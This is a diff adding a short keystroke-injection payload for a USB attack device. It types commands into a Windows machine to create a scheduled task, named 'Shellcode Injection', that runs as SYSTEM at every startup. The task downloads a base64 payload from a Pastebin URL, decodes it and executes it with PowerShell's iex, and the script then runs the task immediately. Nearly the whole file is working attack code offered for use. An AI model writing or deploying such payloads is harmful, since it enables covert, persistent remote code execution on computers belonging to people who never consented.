@@ -1,0 +1,35 @@
+#!/bin/bash
+
+# DELAY IN MS
+# SFD = Super Fast Delay (waiting for CTRL V for example)
+SFD=100
+# FD = Fast Delay (waiting for WIN R for example)
+FD=500
+# ND = Normal Delay (waiting for programs to shut off)
+ND=1000
+# LD = Long Delay (waiting for programs to start or bash scripts to execute)
+LD=1500
+
+# SETUP
+LED M
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+DRIVER_LABEL='USB'
+
+# ATTACK
+LED ATTACK
+QUACK DELAY $FD
+QUACK GUI r
+QUACK DELAY $FD
+QUACK STRING cmd
+QUACK ENTER
+QUACK DELAY $LD
+QUACK STRING schtasks /create /tn 'Shellcode Injection' /tr 'powershell -nop -c (New-Object System.Net.WebClient).DownloadString(''https://pastebin.com/raw/{PASTEBIN_SHELLCODE_ID}'') | powershell.exe -nop -c (gc -Encoding ASCII | % {[Convert]::FromBase64String($_)}) | iex' /sc onstart /ru System /rp SYSTEM & schtasks /run /tn 'Shellcode Injection'
+QUACK ENTER
+
+# CLEANUP
+LED Y
+
+# FINISH
+LED FINISH
+ATTACKMODE OFF
